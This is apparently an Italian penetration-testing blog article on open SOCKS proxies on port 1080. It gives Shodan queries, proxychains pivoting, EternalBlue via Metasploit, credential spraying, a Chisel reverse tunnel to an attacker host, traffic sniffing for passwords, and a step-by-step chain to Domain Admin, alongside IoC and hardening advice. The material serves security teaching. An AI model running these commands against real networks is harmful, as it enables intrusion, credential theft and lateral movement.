---
title: 'Porta 1080 TCP: SOCKS Proxy e Pivoting nella Rete Interna'
slug: porta-1080-socks-proxy
description: 'La porta 1080 può esporre un SOCKS proxy aperto usabile per pivoting, tunneling e accesso alla rete interna. Scopri come identificarlo, testarlo e sfruttarlo in pentest autorizzati.'
image: /porta-1080-socks-proxy.webp
draft: true
date: 2026-04-10T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - socks5
  - proxychains
---

Un SOCKS proxy sulla porta 1080 TCP è un intermediario di rete che inoltra il traffico TCP (e con SOCKS5 anche UDP) dal client alla destinazione — qualsiasi destinazione. A differenza di un proxy HTTP che gestisce solo traffico web, SOCKS è protocol-agnostic: [SSH](https://hackita.it/articoli/ssh), [RDP](https://hackita.it/articoli/porta-3389-rdp), [SMB](https://hackita.it/articoli/smb), [LDAP](https://hackita.it/articoli/porta-389-ldap), database — tutto passa. Nel penetration testing, un proxy SOCKS aperto è un **punto di pivot gratuito**: ti connetti dalla tua macchina e raggiungi la rete interna come se fossi dentro. Non serve compromettere un host, non serve una VPN — il proxy fa tutto il lavoro.

La porta 1080 è il default per SOCKS, ma proxy SOCKS girano anche su porte custom (1081, 8080, 9050 per Tor). Li trovo in aziende che li usano per il filtraggio del traffico, per il bypass di restrizioni geografiche, o come residui di configurazioni Dante/Shadowsocks dimenticate.

Un pentest che mi ha fatto sorridere: azienda di consulenza, 100 dipendenti. Scansione esterna → porta 1080 aperta su Internet, SOCKS5 proxy senza autenticazione. Ho configurato `proxychains` e ho scansionato la rete interna `10.0.0.0/24` attraverso il proxy. 47 host attivi, [SMB](https://hackita.it/articoli/smb) aperto su 12 di essi. Il proxy era un vecchio server Dante che "serviva per i test" e nessuno ricordava di aver messo online. Dall'esterno alla rete interna senza exploit, senza credenziali, senza niente.

## Cos'è la Porta 1080?

La porta 1080 TCP è la porta standard per i proxy SOCKS (Socket Secure), un protocollo di tunneling a livello di trasporto che permette ai client di instradare qualsiasi tipo di traffico TCP/UDP attraverso un server intermedio. SOCKS4 supporta solo TCP, SOCKS5 aggiunge UDP e autenticazione. Se un proxy SOCKS sulla porta 1080 è accessibile senza autenticazione, qualsiasi utente può usarlo per raggiungere reti interne, mascherare il proprio IP e tunnelare traffico arbitrario.

> **La porta 1080 è pericolosa?**
> Sì, se il proxy SOCKS non richiede autenticazione e non ha restrizioni sulle destinazioni raggiungibili. Un attaccante può usarlo come **punto di pivot** per accedere alla rete interna, scansionare host, lanciare attacchi e mascherare la propria origine. L'impatto è **accesso non autorizzato alla rete interna** e **anonimizzazione degli attacchi**.

## Come Verificare se un SOCKS Proxy È Esposto su Internet

```bash
# Shodan
port:1080 "socks"
port:1080 "\x05\x00"

# Censys
services.port=1080 AND services.service_name=SOCKS

# ZoomEye
port:1080 +socks5
```

Un proxy SOCKS aperto su Internet è un gateway verso la rete interna dell'azienda — chiunque al mondo può usarlo per pivotare. Shodan indicizza migliaia di proxy SOCKS aperti, molti con accesso diretto a reti interne corporate. I criminali li usano per mascherare attacchi.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 1080,1081,9050 10.10.10.40
nmap -p 1080 --script socks-open-proxy 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
1080/tcp open  socks5  (no auth required)
```

### Test manuale SOCKS5

```bash
# Test con curl
curl -x socks5://10.10.10.40:1080 http://ifconfig.me
# Se risponde con l'IP del proxy → è un proxy aperto

# Test con ncat
ncat --proxy 10.10.10.40:1080 --proxy-type socks5 example.com 80
```

### Versione SOCKS

```bash
# SOCKS4 test
curl -x socks4://10.10.10.40:1080 http://ifconfig.me

# SOCKS5 test
curl -x socks5://10.10.10.40:1080 http://ifconfig.me

# SOCKS5 con risoluzione DNS remota
curl -x socks5h://10.10.10.40:1080 http://internal-server.corp.local
```

`socks5h` risolve il DNS attraverso il proxy → puoi raggiungere hostname interni senza conoscere l'IP.

### Test autenticazione

```bash
# Se richiede auth
curl -x socks5://user:pass@10.10.10.40:1080 http://ifconfig.me
```

Credenziali comuni: `admin:admin`, `proxy:proxy`, `user:user`, `socks:socks`.

## 2. Pivoting — L'Uso Principale

### Proxychains

```bash
# Configura proxychains
echo "socks5 10.10.10.40 1080" >> /etc/proxychains4.conf

# Scansiona la rete interna attraverso il proxy
proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.0.0.0/24

# Connettiti a servizi interni
proxychains ssh admin@10.0.0.50
proxychains smbclient //10.0.0.60/share -U user
proxychains xfreerdp /v:10.0.0.70 /u:admin /p:pass
```

### Metasploit con proxy

```bash
# In Metasploit
setg Proxies socks5:10.10.10.40:1080
setg ReverseAllowProxy true
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.50
run
```

### CrackMapExec attraverso proxy

```bash
proxychains crackmapexec smb 10.0.0.0/24 -u 'admin' -p 'Password1'
```

### Chisel / SSH SOCKS (creare il tuo proxy)

Se hai compromesso un host e vuoi creare un SOCKS proxy:

```bash
# Chisel — server sull'attaccante
chisel server --reverse -p 8080

# Chisel — client sul target compromesso
./chisel client 10.10.10.200:8080 R:socks

# Ora hai un SOCKS proxy su localhost:1080 → accesso alla rete del target
```

```bash
# SSH SOCKS proxy (se hai SSH al target)
ssh -D 1080 -N user@10.10.10.40
# Traffico su localhost:1080 → tunnelato attraverso il target
```

Scopri le migliori teniche e comandi segreti per [chisel](https://hackita.it/articoli/chisel).

## 3. DNS Resolution Attraverso il Proxy

Con SOCKS5 e `socks5h`, la risoluzione DNS avviene sul proxy:

```bash
# Risolvi hostname interni
curl -x socks5h://10.10.10.40:1080 http://intranet.corp.local
curl -x socks5h://10.10.10.40:1080 http://gitlab.corp.local
curl -x socks5h://10.10.10.40:1080 http://jenkins.corp.local:8080
```

Se conosci gli hostname (da [DNS enumeration](https://hackita.it/articoli/dns) o [LDAP](https://hackita.it/articoli/porta-389-ldap)) → raggiungi tutto senza conoscere gli IP.

## 4. Intercettazione Traffico

Se hai accesso al server proxy (o lo hai compromesso), puoi intercettare tutto il traffico che passa:

```bash
# tcpdump sul server proxy
tcpdump -i any -w /tmp/proxy_traffic.pcap port not 1080

# Estrai credenziali in chiaro
tcpdump -i any -A port 80 or port 21 or port 110 or port 143 | grep -iE "user|pass|login|auth"
```

## 5. Micro Playbook Reale

**Minuto 0-2 → Test proxy aperto**

```bash
nmap -p 1080 --script socks-open-proxy TARGET
curl -x socks5://TARGET:1080 http://ifconfig.me
```

**Minuto 2-5 → Verifica accesso rete interna**

```bash
curl -x socks5h://TARGET:1080 http://10.0.0.1  # Gateway?
proxychains nmap -sT -Pn -p 80,443 10.0.0.1-10 --open
```

**Minuto 5-20 → Scansione rete interna**

```bash
proxychains nmap -sT -Pn -p 22,80,443,445,3389,8080 10.0.0.0/24 --open
```

**Minuto 20+ → Exploit servizi interni attraverso il proxy**

```bash
proxychains crackmapexec smb 10.0.0.0/24 -u admin -p Password1
proxychains xfreerdp /v:10.0.0.50:3389 /u:admin /p:pass
```

## 6. Caso Studio Concreto

**Settore:** Azienda di consulenza, 100 dipendenti.

**Scope:** Pentest esterno.

Scansione IP pubblico → porta 1080 aperta, SOCKS5 senza auth. Un vecchio server Dante che nessuno ricordava di aver configurato.

Ho configurato `proxychains` e scansionato `10.0.0.0/24` attraverso il proxy: 47 host attivi. 12 con [SMB](https://hackita.it/articoli/smb) aperto, 3 con [RDP](https://hackita.it/articoli/porta-3389-rdp), un [Jenkins](https://hackita.it/articoli/porta-8080-tomcat) sulla 8080 senza auth. Attraverso Jenkins ho ottenuto credenziali [SSH](https://hackita.it/articoli/ssh) nei build log → accesso a un server di staging → pivot nella rete interna vera.

Dall'altra parte, ho trovato il [Domain Controller](https://hackita.it/articoli/active-directory) su `10.0.0.10` — [LDAP](https://hackita.it/articoli/porta-389-ldap) enumeration attraverso il proxy → password nel description field di un service account → Domain Admin.

**Tempo dal proxy SOCKS alla rete interna:** 0 secondi (il proxy ERA l'accesso). **Tempo a Domain Admin:** 2 ore. **Root cause:** Proxy SOCKS esposto su Internet senza auth, server dimenticato, nessun monitoraggio.

## 7. Errori Comuni Reali Trovati nei Pentest

**1. Proxy SOCKS senza autenticazione**
Il default per Dante, Shadowsocks e molte configurazioni custom. Nessuna password → chiunque lo usa.

**2. Proxy esposto su Internet**
"Era per i test" → nessuno lo ha rimosso. La porta 1080 sul firewall dimenticata.

**3. Nessuna restrizione sulle destinazioni**
Il proxy può raggiungere qualsiasi IP e porta della rete interna. Nessun ACL che limiti le destinazioni raggiungibili.

**4. Nessun monitoraggio del traffico**
Nessun log di chi usa il proxy e verso dove. Un attaccante scansiona la rete interna per ore senza essere rilevato.

**5. DNS resolution attiva**
Il proxy risolve gli hostname interni (`corp.local`) per i client esterni. Rivela la topologia anche senza zone transfer.

## 8. Indicatori di Compromissione (IoC)

* **Connessioni alla 1080 da IP esterni** — qualsiasi connessione al SOCKS proxy da Internet è sospetta
* **Volume elevato di connessioni** attraverso il proxy verso range IP interni — port scanning in corso
* **Connessioni a porte sensibili** via proxy: 445 (SMB), 389 (LDAP), 3389 (RDP), 88 (Kerberos) da IP non autorizzati
* **DNS query per hostname interni** dal proxy — risoluzione di `corp.local` per client esterni
* **Traffico anomalo** in orari non lavorativi attraverso il proxy
* **Log Dante/Shadowsocks** (se abilitati): `sockd.conf` logga connessioni — cerca sorgenti sconosciute

## 9. Mini Chain Offensiva Reale

```
SOCKS :1080 (Internet) → Proxychains → Scan Rete Interna → Jenkins No-Auth → SSH Creds → Staging Server → LDAP Enum → Password Description → Domain Admin
```

**Step 1 — Configura proxy**

```bash
echo "socks5 TARGET 1080" >> /etc/proxychains4.conf
curl -x socks5://TARGET:1080 http://ifconfig.me  # Conferma funzionamento
```

**Step 2 — Scansione interna**

```bash
proxychains nmap -sT -Pn -p 22,80,445,8080,3389 10.0.0.0/24 --open
# → 10.0.0.30:8080 (Jenkins), 10.0.0.10:389 (DC), 10.0.0.50:3389 (RDP)
```

**Step 3 — Jenkins senza auth**

```bash
proxychains curl -s http://10.0.0.30:8080/credentials/
# → SSH creds nei build log
```

**Step 4 — LDAP enumeration**

```bash
proxychains ldapdomaindump 10.0.0.10 -u 'corp\user' -p 'pass' -o /tmp/dump/
grep -i "pass" /tmp/dump/domain_users.grep
# → svc_deploy: "temp password Deploy2024!"
```

**Step 5 — Domain Admin**

```bash
proxychains crackmapexec smb 10.0.0.10 -u svc_deploy -p 'Deploy2024!'
# → [+] CORP\svc_deploy (Pwn3d!)
```

Da un proxy SOCKS dimenticato su Internet → Domain Admin senza un singolo exploit.

## 10. Detection & Hardening

* **Autenticazione** — SOCKS5 con username/password (Dante: `socksmethod: username`)
* **Non esporre su Internet** — mai la porta 1080 sul firewall
* **Restrizioni destinazione** — ACL che limitano gli IP e le porte raggiungibili
* **Logging** — abilita log completi di connessioni con IP sorgente e destinazione
* **Monitoraggio** — alert su connessioni al proxy da IP sconosciuti
* **Timeout** — limita la durata delle connessioni
* **Rate limiting** — limita il numero di connessioni per IP sorgente
* **Inventario** — verifica periodicamente che non ci siano proxy non autorizzati in rete

## 11. Mini FAQ

**Un SOCKS proxy è diverso da un HTTP proxy?**
Sì: un HTTP proxy gestisce solo traffico HTTP/HTTPS. Un SOCKS proxy gestisce **qualsiasi protocollo TCP** (e UDP con SOCKS5) — SSH, RDP, SMB, database, tutto. Per il pentester è molto più utile perché permette di raggiungere qualsiasi servizio, non solo pagine web.

**Come creo un SOCKS proxy durante un pentest?**
Con SSH: `ssh -D 1080 -N user@target` crea un SOCKS proxy su `localhost:1080` che tunnela il traffico attraverso il target. Con Chisel: `chisel client ATTACKER:8080 R:socks`. Con Metasploit: `post/multi/manage/autoroute` + `auxiliary/server/socks_proxy`.

**proxychains è l'unico modo per usare un SOCKS proxy?**
No: molti tool supportano proxy nativamente. `curl -x socks5://`, `xfreerdp /proxy:`, Metasploit `setg Proxies`, Burp Suite con proxy chain, Firefox con `network.proxy.socks`. `proxychains` è utile per tool che non supportano proxy nativamente.

## 12. Cheat Sheet Finale

| Azione         | Comando                                                                   |
| -------------- | ------------------------------------------------------------------------- |
| Nmap           | `nmap -sV -p 1080 --script socks-open-proxy target`                       |
| Test curl      | `curl -x socks5://target:1080 http://ifconfig.me`                         |
| Test socks5h   | `curl -x socks5h://target:1080 http://internal.corp.local`                |
| Proxychains    | `echo "socks5 target 1080" >> /etc/proxychains4.conf`                     |
| Scan via proxy | `proxychains nmap -sT -Pn -p PORT INTERNAL_RANGE --open`                  |
| CME via proxy  | `proxychains crackmapexec smb RANGE -u user -p pass`                      |
| SSH via proxy  | `proxychains ssh user@INTERNAL_IP`                                        |
| RDP via proxy  | `proxychains xfreerdp /v:INTERNAL_IP /u:user /p:pass`                     |
| SSH SOCKS      | `ssh -D 1080 -N user@target`                                              |
| Chisel         | `chisel server --reverse -p 8080` + `chisel client ATTACKER:8080 R:socks` |
| MSF proxy      | `setg Proxies socks5:target:1080`                                         |

***

Riferimento: RFC 1928 (SOCKS5), Dante proxy docs, proxychains, HackTricks pivoting. Uso esclusivo in ambienti autorizzati.

> C'è un proxy SOCKS aperto nella tua rete? È come lasciare la porta sul retro spalancata. [Penetration test HackIta](https://hackita.it/servizi) per mappare tutti i punti di accesso. Per padroneggiare il pivoting e il lateral movement: [formazione 1:1](https://hackita.it/formazione).
